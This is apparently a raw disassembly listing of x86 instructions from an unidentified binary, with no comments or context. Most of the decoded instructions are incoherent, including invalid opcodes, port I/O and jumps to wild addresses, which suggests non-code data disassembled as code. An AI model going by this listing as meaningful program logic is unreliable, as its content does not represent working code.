  450f90:	mov    ds:0xdded653e,al
  450f95:	add    BYTE PTR ds:[eax],al
	...
  450fb4:	mov    eax,0x533f01ec
  450fb9:	out    dx,al
  450fba:	xor    al,0x3f
  450fbc:	pop    es
  450fbd:	out    dx,eax
  450fbe:	ins    BYTE PTR es:[edi],dx
  450fbf:	aas    
  450fc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  450fc1:	in     eax,dx
  450fc2:	nop
  450fc3:	aas    
  450fc4:	outs   dx,DWORD PTR ds:[esi]
  450fc5:	out    dx,al
  450fc6:	sar    BYTE PTR [edi],0x43
  450fc9:	out    dx,al
  450fca:	(bad)  
  450fcb:	push   esp
  450fcd:	adc    bh,bl
  450fcf:	call   DWORD PTR [ebx+eax*1]
  450fd2:	add    BYTE PTR [eax],al
  450fd4:	call   0xc7519cb
  450fd9:	hlt    
  450fda:	inc    esp
  450fdb:	xor    BYTE PTR [edx+esi*8+0x56],bh
  450fdf:	xor    BYTE PTR [edx+0x783064f2],cl
  450fe5:	bnd jb 0x451018
  450fe8:	or     eax,0xfd8b0cdb
  450fed:	ror    BYTE PTR [edx+edx*8],cl
  450ff0:	std    
  450ff1:	std    
  450ff2:	or     al,0x1d
  450ff4:	cld    
  450ff5:	xchg   esp,eax
  450ff6:	adc    esi,DWORD PTR [ebx-0x24]
  450ff9:	ficom  WORD PTR [ebx]
  450ffb:	rcr    esp,0x4e
  450ffe:	or     al,0xfd
  451000:	fadd   QWORD PTR [edx]
  451002:	push   cs
  451003:	xor    bl,bh
  451005:	mov    eax,0x743f880d
  45100a:	or     eax,0xd8a3fc2
  45100f:	(bad)  
  451010:	aas    
  451011:	ds or  eax,0xf2a3e08
  451017:	aas    
	...
  451034:	add    BYTE PTR [eax],al
  451036:	push   ds
  451037:	mov    edi,0xd81e760e
  45103c:	push   cs
  45103d:	mov    WORD PTR [esi],ds
  45103f:	or     DWORD PTR [esi],0xffffffbc
  451042:	push   ds
  451043:	xchg   esp,eax
  451044:	push   cs
  451045:	add    eax,DWORD PTR [ecx]
  451047:	sub    edx,DWORD PTR [eax]
  451049:	dec    edx
  45104a:	stc    
  45104b:	in     eax,0x17
  45104d:	fadd   QWORD PTR [ecx]
  45104f:	push   ebp
  451050:	adc    DWORD PTR [ecx],esp
  451052:	clc    
  451053:	push   ds
  451054:	adc    DWORD PTR [ebp-0x20],ebx
  451057:	dec    esi
  451058:	adc    DWORD PTR [eax],eax
  45105a:	(bad)  [esi+0x12]
  45105d:	adc    ah,bl
  45105f:	add    eax,0x20db2e12
  451064:	adc    ch,BYTE PTR [esi+0x43]
  451067:	ficom  WORD PTR [ecx]
  451069:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  45106a:	cmp    ebp,DWORD PTR [edi+0x3e421211]
  451070:	adc    esi,DWORD PTR [eax+0x3a]
  451073:	fst    QWORD PTR [edx]
  451075:	mov    dl,0x22
  451077:	adc    dl,BYTE PTR [ebx]
  451079:	adc    DWORD PTR ds:0x157e1445,esp
  45107f:	add    BYTE PTR [esi],dh
  451081:	sbb    al,0x64
  451083:	pop    es
  451084:	inc    ecx
  451085:	sbb    eax,DWORD PTR [eax+0x61b0e07]
  45108b:	or     dl,BYTE PTR [edx+0x1a]
  45108e:	scas   al,BYTE PTR es:[edi]
  45108f:	or     dl,BYTE PTR [eax+0x19]
  451092:	or     ecx,DWORD PTR [edi+eiz*4]
  451095:	pop    ds
  451096:	sbb    eax,0x1ffb0c
	...
  4510b7:	add    dh,ch
  4510b9:	or     bl,BYTE PTR [ebx]
  4510bb:	pop    ds
  4510bc:	mov    ecx,DWORD PTR [esi]
  4510be:	pushf  
  4510bf:	sbb    eax,0x1dd30e53
  4510c4:	or     al,0xd
  4510c6:	add    al,0x1d
  4510c8:	into   
  4510c9:	or     al,0x46
  4510cb:	sbb    eax,0x1c6d0ce9
  4510d0:	xchg   ebp,eax
  4510d1:	or     eax,0xd3d1c7f
  4510d6:	pushf  
  4510d7:	sbb    al,0xd
  4510d9:	add    bh,ah
  4510db:	arpl   WORD PTR [eax+0x4d],bx
  4510de:	push   ss
  4510df:	add    ecx,DWORD PTR ds:0x913f900
  4510e5:	adc    BYTE PTR [ecx],dh
  4510e7:	adc    al,0xb0
  4510e9:	(bad)  
  4510ea:	unpcklps xmm5,XMMWORD PTR [edx+0x10]
  4510ee:	adc    BYTE PTR [ebx],0xec
  4510f1:	push   cs
  4510f2:	mov    ah,0x12
  4510f4:	mov    ch,0xe
  4510f6:	arpl   WORD PTR [edx],dx
  4510f8:	xor    eax,0x1412760f
  4510fd:	psubsw mm2,QWORD PTR [ecx]
  451100:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  451101:	adc    ecx,edx
  451103:	adc    DWORD PTR [esi+0x2910e111],ebp
  451109:	adc    DWORD PTR [edi],edx
  45110b:	adc    DWORD PTR [edx+0x11],eax
  45110e:	test   eax,0x92114110
  451113:	adc    BYTE PTR [ebx+0x11],ch
  451116:	add    BYTE PTR [ecx-0x3],bl
  451119:	jo     0x451147
  45111b:	dec    esp
	...
  451138:	add    BYTE PTR [eax],al
  45113a:	std    
  45113b:	push   0x2c
  45113d:	push   ecx
  45113e:	std    
  45113f:	xchg   esi,eax
  451140:	sub    al,0x54
  451142:	sbb    eax,0x1d282c96
  451147:	aas    
  451148:	sub    al,0x1d
  45114a:	sbb    eax,0x1d202c3b
  45114f:	sub    ch,BYTE PTR [esp+eax*1]
  451152:	std    
  451153:	bound  ebp,QWORD PTR [ecx+edi*8]
  451156:	adc    cl,BYTE PTR [edi+0x2c]
  451159:	in     al,dx
  45115a:	or     al,BYTE PTR [ecx]
  45115c:	xor    al,0xf4
  45115e:	add    dh,cl
  451160:	xor    ebx,DWORD PTR [esi]
  451162:	sbb    eax,0x1d2533bf
  451167:	scas   eax,DWORD PTR es:[edi]
  451168:	xor    eax,DWORD PTR [eax+0x1d]
  45116b:	int    0x33
  45116d:	pop    esp
  45116e:	sbb    eax,0xfd7b33a2
  451173:	xchg   BYTE PTR [ebx],dh
  451175:	lods   al,BYTE PTR ds:[esi]
  451176:	std    
  451177:	inc    ebp
  451178:	xor    ebx,DWORD PTR [eax-0xeccac03]
  45117e:	std    
  45117f:	push   ds
  451180:	xor    esp,ebx
  451182:	sbb    eax,0x1c0632a9
  451187:	xor    DWORD PTR [edx],0x7b
  45118a:	sbb    al,0x90
  45118c:	xor    al,BYTE PTR [esp+ebx*1+0x31]
  451190:	xor    ah,BYTE PTR [edx-0x7acdd504]
  451196:	cld    
  451197:	add    dh,BYTE PTR [edx]
  451199:	frndint 
  45119b:	jmp    0x451dd1
	...
  4511bc:	jmp    DWORD PTR [edx]
  4511be:	xor    bl,BYTE PTR [eax]
  4511c0:	pop    ds
  4511c1:	adc    DWORD PTR [edx],esi
  4511c3:	adc    al,0x1f
  4511c5:	scas   al,BYTE PTR es:[edi]
  4511c6:	xor    DWORD PTR [edi+0x1f],ebx
  4511c9:	mov    dh,BYTE PTR [ecx]
  4511cb:	add    BYTE PTR [ebx],bh
  4511cd:	out    dx,al
  4511ce:	jmp    0x8237:0x18eec436
  4511d5:	out    dx,al
  4511d6:	pop    ebx
  4511d7:	aaa    
  4511d8:	(bad)  
  4511d9:	out    dx,al
  4511da:	gs aaa 
  4511dc:	jo     0x4511cc
  4511de:	test   BYTE PTR [edi],dh
  4511e0:	cs out dx,eax
  4511e2:	mov    ecx,0xdcef1437
  4511e7:	aaa    
  4511e8:	mov    ebx,0xe37f3ee
  4511ed:	out    dx,eax
  4511ee:	stc    
  4511ef:	aaa    
  4511f0:	sahf   
  4511f1:	out    0x10,eax
  4511f3:	cmp    BYTE PTR [edx+0x63381ce7],bh
  4511f9:	out    0x34,eax
  4511fb:	cmp    bl,dl
  4511fd:	jmp    0x451253
  4511ff:	cmp    bh,dl
  451201:	jmp    0x451263
  451203:	cmp    BYTE PTR [ecx],al
  451205:	out    0x91,eax
  451207:	cmp    BYTE PTR [eax-0x77c75119],dl
  45120d:	out    0xd2,eax
  45120f:	cmp    BYTE PTR [edi+eiz*8-0x24],dl
  451213:	cmp    bh,bh
  451215:	in     al,dx
  451216:	jno    0x451251
  451218:	in     al,0xeb
  45121a:	mov    edi,DWORD PTR [ecx]
  45121c:	mov    gs,esp
  45121e:	iret   
  45121f:	cmp    DWORD PTR [eax],eax
	...
  45123d:	add    BYTE PTR [esp+ebp*8-0x4],cl
  451241:	cmp    DWORD PTR [edi],ebp
  451243:	in     eax,dx
  451244:	adc    DWORD PTR [edx],edi
  451246:	js     0x451235
  451248:	cmp    DWORD PTR [edx],edi
  45124a:	xor    al,0xed
  45124c:	je     0x451288
  45124e:	sahf   
  45124f:	in     al,dx
  451250:	(bad)  
  451251:	cmp    al,dl
  451253:	in     al,dx
  451254:	scas   eax,DWORD PTR es:[edi]
  451255:	cmp    ah,dl
  451257:	in     al,dx
  451258:	enter  0xd23a,0xec
  45125c:	jmp    0x451298
  45125e:	gs in  eax,dx
  451260:	or     eax,0x18fe0d3b
  451265:	das    
  451266:	ss nop
  451268:	sbb    DWORD PTR [eax+0x36],esi
  45126b:	fistp  WORD PTR [ecx]
  45126d:	or     eax,0xd0111029
  451272:	and    ebx,ebp
  451274:	adc    ah,bl
  451276:	sbb    DWORD PTR [edi+0x17],edx
  451279:	bound  edx,QWORD PTR [eax]
  45127b:	dec    ebp
  45127c:	push   ss
  45127d:	inc    edi
  45127e:	or     edx,DWORD PTR [ebx-0x1cfc83ea]
  451284:	push   ss
  451285:	xchg   edi,eax
  451286:	sti    
  451287:	or     edx,DWORD PTR [edi]
  451289:	mov    bh,0xf3
  45128b:	sbb    BYTE PTR [edi],dl
  45128d:	int3   
  45128e:	jmp    0x4512ad
  451290:	pop    ss
  451291:	out    dx,al
  451292:	jecxz  0x4512be
  451294:	adc    eax,0x1594da1f
  451299:	cmp    dl,dl
  45129b:	test   al,0x16
  45129d:	jge    0x4512e9
  45129f:	adc    BYTE PTR [esi],0xb8
	...
  4512be:	add    BYTE PTR [eax],al
  4512c0:	inc    edx
  4512c1:	pushf  
  4512c2:	push   ss
  4512c3:	aad    0x3a
  4512c5:	pop    ecx
  4512c6:	dec    esp
  4512c7:	std    
  4512c8:	jb     0x451286
  4512ca:	add    eax,DWORD PTR [eax]
  4512cc:	or     eax,0x1d5e0c2c
  4512d1:	int    0x13
  4512d3:	das    
  4512d4:	sbb    al,0x52
  4512d6:	or     eax,0xd141c41
  4512db:	jo     0x4512d9
  4512dd:	mov    dl,0xc
  4512df:	sar    esp,cl
  4512e1:	jnp    0x4512ef
  4512e3:	add    edi,edi
  4512e5:	inc    esi
  4512e6:	adc    ah,BYTE PTR [esi-0x1]
  4512e9:	dec    esp
  4512ea:	adc    dl,BYTE PTR [edi+ebx*8-0x2035ee54]
  4512f1:	push   0x11
  4512f3:	add    dh,bl
  4512f5:	(bad)  
  4512f6:	adc    edi,DWORD PTR [ecx]
  4512f8:	fdivp  st(7),st
  4512fa:	mov    esi,0xc90d7514
  4512ff:	adc    al,0xa1
  451301:	or     eax,0xddb1539
  451306:	inc    eax
  451307:	adc    eax,0xffc1424
  45130c:	pop    ecx
  45130d:	adc    al,0xc6
  45130f:	pcmpeqb mm2,QWORD PTR [ecx+edx*2]
  451313:	adc    BYTE PTR [edx+0x38106d14],dh
  451319:	adc    ebx,DWORD PTR [ebx+0x12]
  45131c:	jno    0x451325
  45131e:	ss sbb eax,0x1d1c05b5
	...
  451340:	add    BYTE PTR [eax],al
  451342:	jae    0x451350
  451344:	das    
  451345:	sbb    al,dl
  451347:	or     edi,esp
  451349:	add    ebp,DWORD PTR [eax+0xd03d249]
  45134f:	add    bl,dh
  451351:	adc    ebx,DWORD PTR [edx]
  451353:	cmovp  edx,DWORD PTR [esi]
  451356:	(bad)  [eax]
  451358:	inc    ebx
  451359:	sbb    DWORD PTR ds:0x81f3e700,ecx
  45135f:	dec    ecx
  451360:	sub    al,BYTE PTR [ecx*1-0x16eb9200]
  451367:	adc    esi,DWORD PTR [esi-0x4ececf1]
  45136d:	push   cs
  45136e:	hlt    
  45136f:	adc    DWORD PTR [eax],esi
  451371:	adc    dl,bh
  451373:	adc    DWORD PTR [eax+0x11],edi
  451376:	fist   WORD PTR [eax]
  451378:	imul   edx,DWORD PTR [eax],0x1bc2116b
  45137e:	repnz pop es
  451380:	sbb    bl,BYTE PTR [edx+edi*4]
  451383:	pop    es
  451384:	pushf  
  451385:	sbb    ebx,DWORD PTR [eax+0x8]
  451388:	pop    ss
  451389:	sbb    eax,eax
  45138b:	push   es
  45138c:	outs   dx,DWORD PTR ds:[esi]
  45138d:	sbb    dl,BYTE PTR [eax-0x85efff9]
  451393:	ss ss xchg edi,eax
  451396:	mul    DWORD PTR [esi+esi*1]
  451399:	dec    ebp
  45139a:	daa    
  45139b:	arpl   WORD PTR [esi],si
  45139d:	pop    ebx
  45139e:	daa    
  45139f:	pop    ebx
  4513a0:	cmp    cl,ch
  4513a2:	cs dec ebx
  4513a4:	clc    
  4513a5:	or     DWORD PTR [eax],eax
	...
  4513c3:	add    BYTE PTR [ecx],cl
  4513c5:	add    BYTE PTR [eax],al
  4513c7:	in     eax,0xfe
  4513c9:	and    dh,BYTE PTR [eax]
  4513cb:	push   0xfffffff9
  4513cd:	fwait
  4513ce:	sub    al,0x72
  4513d0:	add    ebx,ebp
  4513d2:	aaa    
  4513d3:	clc    
  4513d4:	not    BYTE PTR [edx+0x5a287136]
  4513da:	xor    eax,0x21de
  4513df:	jmp    0x8e3d5f02
  4513e4:	push   cs
  4513e5:	add    BYTE PTR [eax],al
  4513e7:	cmp    dh,0x8a
  4513ea:	das    
  4513eb:	scas   eax,DWORD PTR es:[edi]
  4513ec:	clc    
  4513ed:	jle    0x45141c
  4513ef:	jg     0x4513ee
  4513f1:	sbb    eax,0xcaf1bc37
  4513f6:	xor    al,0x5
  4513f8:	and    al,0x20
  4513fa:	cmp    eax,DWORD PTR ds:0x53b1824
  451400:	adc    al,0x10
  451402:	cmp    edx,DWORD PTR ds:0x53b0814
  451408:	add    al,0xc0
  45140a:	cmp    ah,BYTE PTR ds:0x253ab804
  451410:	hlt    
  451411:	scas   eax,DWORD PTR es:[edi]
  451412:	cmp    dl,BYTE PTR ds:0x453aa7f4
  451418:	and    al,0xe0
  45141a:	cmp    al,BYTE PTR ds:0x53ad824
  451420:	adc    al,0xd0
  451422:	cmp    dl,BYTE PTR ds:0x3ac814
	...
  451444:	add    BYTE PTR [eax],al
  451446:	adc    bh,ah
  451448:	jg     0x451487
  45144a:	test   al,0xe6
  45144c:	xchg   DWORD PTR ds:0x3d8fe6b0,edi
  451452:	mov    eax,0x903d97e6
  451457:	jmp    0xe9cd51fb
  45145c:	or     eax,0x49eeaf3f
  451461:	aas    
  451462:	mov    ds:0xd23f61ee,al
  451467:	out    dx,al
  451468:	(bad)  
  451469:	aas    
  45146a:	inc    eax
  45146b:	out    dx,eax
  45146c:	mov    al,ds:0xcfef2d3f
  451471:	aas    
  451472:	add    bh,ch
  451474:	out    0x3f,eax
  451476:	lock out dx,al
  451478:	(bad)  
  451479:	push   DWORD PTR [ebx+eax*2+0x368fffb]
  451480:	add    BYTE PTR [eax],al
  451482:	shl    bl,cl
  451484:	adc    DWORD PTR [eax],esi
  451486:	fcomi  st,st(3)
  451488:	cmp    BYTE PTR [eax],dh
  45148a:	jb     0x45147f
  45148c:	push   ecx
  45148d:	xor    BYTE PTR [edx+0x303071f3],cl
  451493:	in     al,dx
  451494:	xchg   edi,eax
  451495:	xor    BYTE PTR [ecx-0x39cf430d],bl
  45149b:	repz aad 0x30
  45149e:	dec    esi
  45149f:	repz cmc 
  4514a1:	xor    BYTE PTR [esp+ebp*8+0x1b],dh
  4514a5:	xor    ebp,edi
  4514a7:	in     al,dx
  4514a8:	dec    edx
  4514a9:	xor    DWORD PTR [eax],eax
	...
  4514c7:	add    cl,cl
  4514c9:	in     al,dx
  4514ca:	push   0x98ed2131
  4514cf:	xor    DWORD PTR [esi],eax
  4514d1:	jmp    0xeeac525d
  4514d6:	(bad)  
  4514d7:	aas    
  4514d8:	xchg   esp,eax
  4514d9:	out    dx,al
  4514da:	(bad)  
  4514db:	dec    DWORD PTR ds:0x32fcac59
  4514e1:	cmp    eax,0xf70dfffc
  4514e6:	adc    esi,DWORD PTR [ebp+ebx*8+0x28]
  4514ea:	adc    ebx,DWORD PTR [esi]
  4514ec:	fsub   st(1),st
  4514ee:	or     DWORD PTR [ebx-0x25],esp
  4514f1:	dec    ebp
  4514f2:	or     al,BYTE PTR [edi+0x731b2943]
  4514f8:	inc    esp
  4514f9:	test   DWORD PTR [ecx],edx
  4514fb:	mov    bh,0x3a
  4514fd:	adc    al,0x12
  4514ff:	add    BYTE PTR ds:0xeafcdc59,cl
  451505:	cwde   
  451506:	cld    
  451507:	dec    DWORD PTR ds:0x1fcd0e42
  45150d:	ins    DWORD PTR es:[edi],dx
  45150e:	or     eax,0xffa1e80
  451513:	cmp    DWORD PTR [ecx],eax
  451515:	mov    cs,WORD PTR [eax]
  451517:	push   0xfffffff9
  451519:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  45151a:	or     BYTE PTR [edx-0x66f53bfd],cl
  451520:	sti    
  451521:	add    al,0xb
  451523:	pop    ss
  451524:	in     al,0xa5
  451526:	sbb    ebx,DWORD PTR [ebp-0x54e3e51c]
	...
  451548:	add    BYTE PTR [eax],al
  45154a:	xlat   BYTE PTR ds:[ebx]
  45154b:	in     eax,dx
  45154c:	push   ss
  45154d:	daa    
  45154e:	ror    BYTE PTR [ebx-0x3eb4c0e9],1
  451554:	adc    ah,BYTE PTR [eax+0x42]
  451557:	loope  0x45156b
  451559:	hlt    
  45155a:	cmp    dh,BYTE PTR [ebx]
  45155c:	adc    al,BYTE PTR [eax]
  45155e:	or     eax,0x6afccc59
  451563:	js     0x451568
  451565:	add    BYTE PTR ds:0x1dbc13cf,cl
  45156b:	fwait
  45156c:	adc    ecx,eax
  45156e:	sbb    eax,0xfdd41367
  451573:	(bad)  
  451574:	mov    ebp,0x900f6314
  451579:	adc    al,0x3d
  45157b:	setp   BYTE PTR [edi+esi*1]
  45157f:	pmulhuw mm2,QWORD PTR [edx]
  451582:	push   ss
  451583:	adc    esp,ebx
  451585:	adc    al,BYTE PTR [esi]
  451587:	adc    eax,edx
  451589:	adc    ch,bl
  45158b:	adc    BYTE PTR [edx+0x2210d612],bh
  451591:	adc    ebx,DWORD PTR [ebp+0xf]
  451594:	mov    esi,0xc90f6a12
  451599:	adc    al,BYTE PTR [ecx-0x70ed2df1]
  45159f:	paddd  mm2,QWORD PTR [ecx]
  4515a2:	and    DWORD PTR [edx],edx
  4515a4:	dec    edx
  4515a5:	adc    bl,dh
  4515a7:	adc    ah,BYTE PTR [ecx+edx*1+0x7b]
  4515ab:	adc    DWORD PTR [edx+0x11],eax
	...
  4515ca:	add    BYTE PTR [eax],al
  4515cc:	fst    DWORD PTR [ecx]
  4515ce:	jecxz  0x4515df
  4515d0:	inc    edx
  4515d1:	or     al,0x29
  4515d3:	adc    BYTE PTR [ecx-0x3eeff0f4],ch
  4515d9:	or     al,0xf
  4515db:	adc    BYTE PTR [ecx],cl
  4515dd:	or     ebx,edi
  4515df:	push   cs
  4515e0:	add    DWORD PTR [ebx],ecx
  4515e2:	fisttp WORD PTR [esi]
  4515e4:	jmp    0xe153e4f3
  4515e9:	or     ch,BYTE PTR [edi-0x60f4b6f2]
  4515ef:	push   cs
  4515f0:	loope  0x4515fc
  4515f2:	aas    
  4515f3:	psubsw mm1,QWORD PTR [edx]
  4515f6:	dec    edi
  4515f7:	sidtd  [ebx]
  4515fa:	dec    edi
  4515fb:	jns    0x8153750c
  451601:	or     ebx,DWORD PTR [edi+0xe]
  451604:	test   eax,0xa10e8f0b
  451609:	or     eax,DWORD PTR [eax]
  45160b:	jno    0x451610
  45160d:	cmp    al,0x32
  45160f:	mov    eax,ds:0xc1322c1b
  451614:	adc    ebx,DWORD PTR [edx+esi*1-0x6f]
  451618:	or     ecx,DWORD PTR [edx+esi*1-0x6f]
  45161c:	add    eax,DWORD PTR [eax]
  45161e:	add    cl,ch
  451620:	into   
  451621:	inc    ebx
  451622:	clc    
  451623:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  451624:	push   cs
  451625:	add    BYTE PTR [eax],al
  451627:	jmp    0xdd75122a
  45162c:	(bad)  
  45162d:	out    0x2f,eax
  45162f:	mov    ebp,0x0
	...
  45164c:	add    BYTE PTR [eax],al
  45164e:	push   ds
  45164f:	mov    al,0x2c
  451651:	mov    ebp,0xbd2ca81d
  451656:	sbb    eax,0x1dcd2ce0
  45165b:	fsubr  DWORD PTR [edi*4-0x42d33003]
  451662:	std    
  451663:	(bad)  
  451664:	sub    al,0xbd
  451666:	std    
  451667:	imul   ebp,DWORD PTR [ecx*4+0x252c8bfd],0x1d
  45166f:	sub    al,0x2c
  451671:	or     eax,0xe52c4c1d
  451676:	or     ch,ah
  451678:	xor    ecx,ebp
  45167a:	add    cl,BYTE PTR [esp+esi*1]
  45167d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  45167e:	sbb    ch,BYTE PTR [ebx+esi*1+0x33cc128d]
  451685:	or     ch,BYTE PTR gs:[ebx+esi*1+0x4d]
  45168a:	add    cl,BYTE PTR [ebx+esi*1+0x332c1a25]
  451691:	int    0x25
  451693:	dec    esp
  451694:	xor    esp,ebp
  451696:	adc    eax,0x140d32ec
  45169b:	or     al,0x33
  45169d:	and    eax,0x32ac04
  4516a2:	shl    dh,1
  4516a4:	jae    0x4516db
  4516a6:	lock out 0x93,al
  4516a9:	xor    eax,0x35b3e680
  4516ae:	jo     0x451696
  4516b0:	shl    DWORD PTR ds:0x0,cl
	...
  4516ce:	add    BYTE PTR [eax],al
  4516d0:	nop
  4516d1:	out    0xf3,al
  4516d3:	xor    eax,0x3613e630
  4516d8:	inc    eax
  4516d9:	out    0x33,al
  4516db:	ss lock jmp 0xea554d35
  4516e2:	jae    0x45171a
  4516e4:	mov    al,0xe9
  4516e6:	xchg   ebx,eax
  4516e7:	ss shr cl,0xb3
  4516eb:	ss mov al,0xe6
  4516ee:	shl    DWORD PTR [esi],cl
  4516f0:	push   eax
  4516f1:	out    0xf3,al
  4516f3:	ss lock out 0x13,al
  4516f7:	aaa    
  4516f8:	add    bh,ah
  4516fa:	xor    esi,DWORD PTR [edi]
  4516fc:	mov    al,0xe6
  4516fe:	dec    edi
  4516ff:	aaa    
  451700:	and    dh,0x57
  451703:	aaa    
  451704:	js     0x4516ec
  451706:	pop    edi
  451707:	aaa    
  451708:	shl    dh,0x67
  45170b:	aaa    
  45170c:	mov    dh,ah
  45170e:	outs   dx,DWORD PTR ds:[esi]
  45170f:	aaa    
  451710:	mov    al,ds:0x983777e6
  451715:	out    0x7f,al
  451717:	aaa    
  451718:	and    bh,ah
  45171a:	xchg   DWORD PTR [edi],esi
  45171c:	dec    eax
  45171d:	out    0x8f,eax
  45171f:	aaa    
  451720:	inc    eax
  451721:	out    0x97,eax
  451723:	aaa    
  451724:	cmp    bh,ah
  451726:	lahf   
  451727:	aaa    
  451728:	inc    eax
  451729:	out    0xa7,eax
  45172b:	aaa    
  45172c:	dec    eax
  45172d:	out    0xaf,eax
  45172f:	aaa    
  451730:	mov    al,ds:0x37b7e6
	...
  451751:	add    BYTE PTR [eax+0xd37c7e6],bl
  451757:	pop    ecx
  451758:	cld    
  451759:	dec    DWORD PTR ds:0xdfffc59
  45175f:	pop    ecx
  451760:	cld    
  451761:	dec    DWORD PTR ds:0xdfffc59
  451767:	pop    ecx
  451768:	cld    
  451769:	dec    DWORD PTR ds:0xdfffc59
  45176f:	pop    ecx
  451770:	cld    
  451771:	dec    DWORD PTR ds:0xdfffc59
  451777:	pop    ecx
  451778:	cld    
  451779:	dec    DWORD PTR ds:0xdfffc59
  45177f:	pop    ecx
  451780:	cld    
  451781:	dec    DWORD PTR ds:0xdfffc59
  451787:	pop    ecx
  451788:	cld    
  451789:	dec    DWORD PTR ds:0xdfffc59
  45178f:	pop    ecx
  451790:	cld    
  451791:	dec    DWORD PTR ds:0xdfffc59
  451797:	pop    ecx
  451798:	cld    
  451799:	dec    DWORD PTR ds:0xdfffc59
  45179f:	pop    ecx
  4517a0:	cld    
  4517a1:	dec    DWORD PTR ds:0xdfffc59
  4517a7:	pop    ecx
  4517a8:	cld    
  4517a9:	dec    DWORD PTR ds:0xdfffc59
  4517af:	pop    ecx
  4517b0:	cld    
  4517b1:	dec    DWORD PTR ds:0xfffc59
	...
  4517d3:	add    BYTE PTR ds:0xdfffc59,cl
  4517d9:	pop    ecx
  4517da:	cld    
  4517db:	dec    DWORD PTR ds:0xdfffc59
  4517e1:	pop    ecx
  4517e2:	cld    
  4517e3:	dec    DWORD PTR ds:0xdfffc59
  4517e9:	pop    ecx
  4517ea:	cld    
  4517eb:	dec    DWORD PTR ds:0xd03e700
  4517f1:	add    bh,ah
  4517f3:	add    ecx,DWORD PTR ds:0xd03e700
  4517f9:	add    bh,ah
  4517fb:	add    ecx,DWORD PTR ds:0xd03e700
  451801:	add    bh,ah
  451803:	add    ecx,DWORD PTR ds:0xd03e700
  451809:	add    bh,ah
  45180b:	add    ecx,DWORD PTR ds:0xd03e700
  451811:	add    bh,ah
  451813:	add    ecx,DWORD PTR ds:0xd03e700
  451819:	add    bh,ah
  45181b:	add    ecx,DWORD PTR ds:0xd03e700
  451821:	add    bh,ah
  451823:	add    ecx,DWORD PTR ds:0xd03e700
  451829:	add    bh,ah
  45182b:	add    ecx,DWORD PTR ds:0xd03e700
  451831:	add    bh,ah
  451833:	add    ecx,DWORD PTR ds:0x3e700
	...
  451855:	add    BYTE PTR ds:0xd03e700,cl
  45185b:	add    bh,ah
  45185d:	add    ecx,DWORD PTR ds:0xd03e700
  451863:	add    bh,ah
  451865:	add    ecx,DWORD PTR ds:0xd03e700
  45186b:	add    bh,ah
  45186d:	add    ecx,DWORD PTR ds:0xd03e700
  451873:	add    bh,ah
  451875:	add    ecx,DWORD PTR ds:0xd03e700
  45187b:	add    bh,ah
  45187d:	add    ecx,DWORD PTR ds:0xd03e700
  451883:	add    BYTE PTR [eax],al
  451885:	jmp    0xe9451898
  45188a:	push   cs
  45188b:	add    BYTE PTR [eax],al
  45188d:	jmp    0xe94518a0
  451892:	push   cs
  451893:	add    BYTE PTR [eax],al
  451895:	jmp    0xe94518a8
  45189a:	push   cs
  45189b:	add    BYTE PTR [eax],al
  45189d:	jmp    0xe94518b0
  4518a2:	push   cs
  4518a3:	add    BYTE PTR [eax],al
  4518a5:	jmp    0xe94518b8
  4518aa:	push   cs
  4518ab:	add    BYTE PTR [eax],al
  4518ad:	jmp    0xe94518c0
  4518b2:	push   cs
  4518b3:	add    BYTE PTR [eax],al
  4518b5:	jmp    0xe94518c8
	...
  4518d6:	add    BYTE PTR [eax],al
  4518d8:	push   cs
  4518d9:	add    BYTE PTR [eax],al
  4518db:	jmp    0xe94518ee
  4518e0:	push   cs
  4518e1:	add    BYTE PTR [eax],al
  4518e3:	jmp    0xe94518f6
  4518e8:	push   cs
  4518e9:	add    BYTE PTR [eax],al
  4518eb:	jmp    0xe94518fe
  4518f0:	push   cs
  4518f1:	add    BYTE PTR [eax],al
  4518f3:	jmp    0xe9451906
  4518f8:	push   cs
  4518f9:	add    BYTE PTR [eax],al
  4518fb:	jmp    0xe945190e
  451900:	push   cs
  451901:	add    BYTE PTR [eax],al
  451903:	jmp    0xe9451916
  451908:	push   cs
  451909:	add    BYTE PTR [eax],al
  45190b:	jmp    0xe945191e
  451910:	push   cs
  451911:	add    BYTE PTR [eax],al
  451913:	jmp    0xe9451926
  451918:	push   cs
  451919:	add    BYTE PTR [eax],al
  45191b:	add    BYTE PTR [esp+edi*8-0x35b0001],ah
  451922:	(bad)  
  451923:	push   DWORD PTR [esp+edi*8-0x1]
  451927:	push   DWORD PTR [esp+edi*8-0x1]
  45192b:	jmp    DWORD PTR [esp+edi*8-0x1]
  45192f:	jmp    DWORD PTR [esp+edi*8-0x1]
  451933:	push   DWORD PTR [esp+edi*8-0x1]
  451937:	push   DWORD PTR [esp+edi*8-0x1]
  45193b:	inc    DWORD PTR [eax]
	...
  451959:	add    BYTE PTR [esp+edi*8-0x1],ah
  45195d:	jmp    DWORD PTR [esp+edi*8-0x1]
  451961:	push   DWORD PTR [esp+edi*8]
  451964:	(bad)  
  451965:	push   DWORD PTR [esp+edi*8]
  451968:	(bad)  
  451969:	jmp    DWORD PTR [esp+edi*8]
  45196c:	(bad)  
  45196d:	jmp    DWORD PTR [esp+edi*8]
  451970:	(bad)  
  451971:	push   DWORD PTR [esp+edi*8]
  451974:	(bad)  
  451975:	push   DWORD PTR [esp+edi*8]
  451978:	(bad)  
  451979:	jmp    DWORD PTR [esp+edi*8]
  45197c:	(bad)  
  45197d:	jmp    DWORD PTR [esp+edi*8]
  451980:	(bad)  
  451981:	push   esp
  451983:	add    eax,DWORD PTR [eax]
  451985:	add    ah,dh
  451987:	add    eax,DWORD PTR [eax]
  451989:	add    ah,ah
  45198b:	add    eax,DWORD PTR [eax]
  45198d:	add    ah,ah
  45198f:	add    eax,DWORD PTR [eax]
  451991:	add    ah,dh
  451993:	add    eax,DWORD PTR [eax]
  451995:	add    ah,dh
  451997:	add    eax,DWORD PTR [eax]
  451999:	add    ah,ah
  45199b:	add    eax,DWORD PTR [eax]
  45199d:	add    ah,ah
  45199f:	add    eax,DWORD PTR [eax]
  4519a1:	add    BYTE PTR [ebx+eax*1+0x3b40000],dh
  4519a8:	add    BYTE PTR [eax],al
  4519aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4519ab:	add    eax,DWORD PTR [eax]
